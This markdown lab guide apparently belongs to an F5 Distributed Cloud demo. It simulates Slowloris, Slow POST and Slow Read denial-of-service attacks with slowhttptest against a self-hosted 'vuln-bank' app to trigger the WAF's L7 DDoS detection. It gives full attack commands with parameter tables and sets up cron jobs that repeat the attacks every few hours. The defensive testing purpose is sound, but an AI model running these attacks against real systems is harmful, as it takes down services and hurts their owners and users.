[Home Page](README.md) · [Vuln-Bank Installation](vuln-bank-install.md) · [F5 XC Configuration](xc-config.md) · [Traffic Generator Setup](traffic-generator.md)

---

# Slow DDoS Attack Simulation — slowhttptest

This guide walks through simulating slow HTTP attacks against the vuln-bank application using **slowhttptest** to trigger F5 XC L7 DDoS detection.

> **Why slowhttptest?** Locust-based scripts send complete HTTP requests and cannot simulate true slow attacks. Slowhttptest operates at the raw socket level — it controls exactly how slowly headers and body data are sent, which is required for Slowloris and Slow POST simulation.

---

## What Is a Slow HTTP Attack?

Slow HTTP attacks exhaust server worker threads without generating high request volume, making them harder to detect than volumetric floods.

| Attack Type | How It Works | Target |
|---|---|---|
| **Slowloris** | Opens many connections and sends HTTP headers one line at a time, never completing the request | Server connection pool |
| **Slow POST (RUDY)** | Sends a POST with a large `Content-Length`, then delivers the body at 1 byte every few seconds | Server worker threads |
| **Slow Read** | Advertises a tiny TCP receive window, forcing the server to deliver the response very slowly | Server send buffers |

---

## Prerequisites

- Linux machine (the traffic generator server or any server with internet access to the target)
- `slowhttptest` installed

---

## Section 1 — Install slowhttptest

```bash
sudo apt update
sudo apt install slowhttptest -y
```

Verify:

```bash
slowhttptest -h
```

---

> **⚡⚡⚡ CHOOSE YOUR PATH FIRST!!!**
> - **Run attacks one by one** — follow Sections 2, 3, and 4 below to run each attack type individually and observe the result
> - **Run all attacks on a schedule** — skip directly to [Section 5 — Run All Attacks Simultaneously on a Schedule](#section-5--run-all-attacks-simultaneously-on-a-schedule) to fire all 3 attacks in parallel on a recurring schedule — _ideal for generating continuous L7 DDoS events in the XC Console_

---

## Section 2 — Slowloris Attack

Slowloris opens many connections to the target and sends HTTP headers extremely slowly — one partial header at a time — keeping connections alive indefinitely without ever completing a request.

**Command:**

```bash
slowhttptest \
  -c 1000 \
  -H \
  -g -o ~/slowloris-report \
  -i 10 \
  -r 200 \
  -t GET \
  -u https://vulnbank.yourdomain.com/ \
  -x 24 \
  -p 3
```

**Parameter breakdown:**

| Parameter | Value | Purpose |
|---|---|---|
| `-c` | `1000` | Number of concurrent connections to open |
| `-H` | — | Slowloris mode — slow headers attack |
| `-g` | — | Generate HTML + CSV statistics report |
| `-o` | `~/slowloris-report` | Output filename prefix for the report |
| `-i` | `10` | Interval (seconds) between each partial header sent |
| `-r` | `200` | Connection rate — how many new connections to open per second |
| `-t` | `GET` | HTTP verb for each connection |
| `-u` | URL | Target URL |
| `-x` | `24` | Max length (bytes) of each partial header value sent |
| `-p` | `3` | Probe timeout (seconds) — how long to wait for an HTTP response to detect server availability |

**Expected output while running:**

```
Slow HTTP test statistics:
  Initiated connections:   1000
  Pending connections:      987
  Finished connections:       3
  Read errors:                0
  Rate of req/s:           0.05
```

A high number of **Pending connections** confirms the server is holding connections open — the attack is working.

---

## Section 3 — Slow POST Attack (RUDY)

RUDY (R-U-Dead-Yet?) sends a legitimate POST request with a declared large body, then delivers the body at 1 byte every few seconds. The server keeps the worker thread open waiting for the rest of the body that never fully arrives.

**Command:**

```bash
slowhttptest \
  -c 1000 \
  -B \
  -g -o ~/slowpost-report \
  -i 110 \
  -r 200 \
  -s 8192 \
  -u https://vulnbank.yourdomain.com/login \
  -x 10 \
  -p 3
```

**Parameter breakdown:**

| Parameter | Value | Purpose |
|---|---|---|
| `-c` | `1000` | Number of concurrent connections |
| `-B` | — | Slow body mode — RUDY / Slow POST attack |
| `-g` | — | Generate HTML + CSV statistics report |
| `-o` | `~/slowpost-report` | Output filename prefix |
| `-i` | `110` | Interval (seconds) between each byte of body data sent |
| `-r` | `200` | Connection rate per second |
| `-s` | `8192` | Content-Length declared in the POST header (bytes) — server waits for this much body data |
| `-u` | URL | Target URL — should be a POST-capable endpoint |
| `-x` | `10` | Max length (bytes) of each body fragment sent |
| `-p` | `3` | Probe timeout in seconds |

> **Why `/login`?** The login endpoint accepts POST requests with a JSON body, making it the most realistic target for a Slow POST attack.

---

## Section 4 — Slow Read Attack

Slow Read advertises a very small TCP receive window in the HTTP response, forcing the server to send the response body in tiny fragments and hold the connection open for a long time.

**Command:**

```bash
slowhttptest \
  -c 1000 \
  -X \
  -g -o ~/slowread-report \
  -r 200 \
  -u https://vulnbank.yourdomain.com/api/docs \
  -p 3 \
  -z 512
```

**Parameter breakdown:**

| Parameter | Value | Purpose |
|---|---|---|
| `-c` | `1000` | Number of concurrent connections |
| `-X` | — | Slow read mode |
| `-g` | — | Generate HTML + CSV statistics report |
| `-o` | `~/slowread-report` | Output filename prefix |
| `-r` | `200` | Connection rate per second |
| `-u` | URL | Target URL — `/api/docs` is a large response, ideal for slow read |
| `-p` | `3` | Probe timeout in seconds |
| `-z` | `512` | TCP receive window size to advertise (bytes) — smaller = slower read |

> **Why `/api/docs`?** Swagger renders the full API schema — a large response body that takes longer to deliver when the receive window is tiny.

---

## Section 5 — Run All Attacks Simultaneously on a Schedule

This section runs Slowloris, Slow POST, and Slow Read **at the same time** for a 15-minute burst, then schedules that burst to repeat automatically every 1, 2, or 4 hours using `cron`.

---

### Step 1 — Prepare the Attack Script

The script [`run-slowddos.sh`](run-slowddos.sh) is included in this repo — no manual creation needed. After cloning or pulling the repo, update the `TARGET` variable to your actual domain:

```bash
nano ~/f5-xc-demo-environment/run-slowddos.sh
# Update: TARGET="https://vulnbank.yourdomain.com"
```

Make it executable and test it manually first:

```bash
chmod +x ~/f5-xc-demo-environment/run-slowddos.sh
~/f5-xc-demo-environment/run-slowddos.sh
```

---

### Step 2 — Schedule with Cron

Open the cron editor:

```bash
crontab -e
```

Add **one** of the following lines depending on your preferred interval:

```bash
# Every 1 hour
0 * * * * /home/youruser/f5-xc-demo-environment/run-slowddos.sh >> /home/youruser/slowddos-logs/cron.log 2>&1

# Every 2 hours
0 */2 * * * /home/youruser/f5-xc-demo-environment/run-slowddos.sh >> /home/youruser/slowddos-logs/cron.log 2>&1

# Every 4 hours
0 */4 * * * /home/youruser/f5-xc-demo-environment/run-slowddos.sh >> /home/youruser/slowddos-logs/cron.log 2>&1
```

> Replace `youruser` with your actual Linux username (e.g. `ubuntu`, `shaugi`).

Save and exit. Verify the cron job is registered:

```bash
crontab -l
```

---

### Step 3 — Monitor and Stop

**Check if attacks are running:**

```bash
ps aux | grep slowhttptest
```

**Stream the latest log:**

```bash
tail -f ~/slowddos-logs/cron.log
```

**Stop all running attacks immediately:**

```bash
pkill -f slowhttptest
```

**Remove the scheduled job:**

```bash
crontab -e
# Delete the line you added, save and exit
```

---

## Section 6 — View the Report

slowhttptest generates an HTML report automatically when `-g` is used:

```bash
# Open in browser (if on desktop)
xdg-open ~/slowloris-report.html

# Or copy to your local machine via SCP
scp ubuntu@YOUR_SERVER_IP:~/slowloris-report.html .
```

The report shows a real-time graph of pending vs. closed connections over the duration of the attack.

---

## What This Generates in F5 XC

Since the LB has **L7 DDoS mitigation in blocking mode**, these attacks should appear in the XC Console:

1. **Console → `vuln-bank` namespace → Security → Security Events**
   - Filter by Action: `Block` or Event Type: `DDoS`

2. **Console → `vuln-bank` namespace → Overview → Dashboard**
   - Connection spike visible in the HTTP traffic graph

3. The blocked requests will show:
   - Source IP of your traffic generator server
   - Blocked action with DDoS violation reason

---

## Quick Reference

| Attack | Command flag | Target endpoint | Effect |
|---|---|---|---|
| Slowloris | `-H` | `/` | Exhausts connection pool |
| Slow POST | `-B` | `/login` | Exhausts worker threads |
| Slow Read | `-X` | `/api/docs` | Exhausts send buffers |

---

## References

- [slowhttptest — GitHub](https://github.com/shekyan/slowhttptest)
- [slowhttptest — Usage Guide](https://github.com/shekyan/slowhttptest/wiki/Usage)
- [F5 XC L7 DDoS Protection](https://docs.cloud.f5.com/docs-v2/ddos-protection)
- [OWASP — Slowloris](https://owasp.org/www-community/attacks/Slowloris)

---

## Quick Links

[Home Page](README.md) · [Vuln-Bank Installation](vuln-bank-install.md) · [F5 XC Configuration](xc-config.md) · [Traffic Generator Setup](traffic-generator.md)
